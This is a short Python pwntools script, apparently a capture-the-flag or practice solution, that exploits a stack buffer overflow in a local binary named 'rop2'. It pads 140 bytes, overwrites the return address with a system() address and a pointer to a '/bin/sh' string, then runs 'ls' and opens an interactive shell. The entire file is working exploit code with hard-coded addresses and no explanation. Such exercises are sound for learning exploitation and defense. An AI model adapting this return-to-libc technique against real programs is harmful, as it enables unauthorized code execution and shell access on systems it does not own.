from pwn import *
#bin/date=0x804861a
#bin/bash=0x8049611
#0xffffd682 ("bin/bash")
bin_sh=0x8049610 # stack ("bin/sh")
not_called=0x080484a4
#0x08048541 : push edi ; push esi ; push ebx ; call 0x80485bb
#0x08048542 : push esi ; push ebx ; call 0x80485ba

r=process('./rop2')

payload='a'*140

#[padding] + [address of system] + [fake return address] + [addres /bin/bash]


payload+=p32(0x80483a0) +  'aaaa' +p32(0x8049610)

print payload

r.sendline(payload)

r.sendline('ls')
r.interactive()
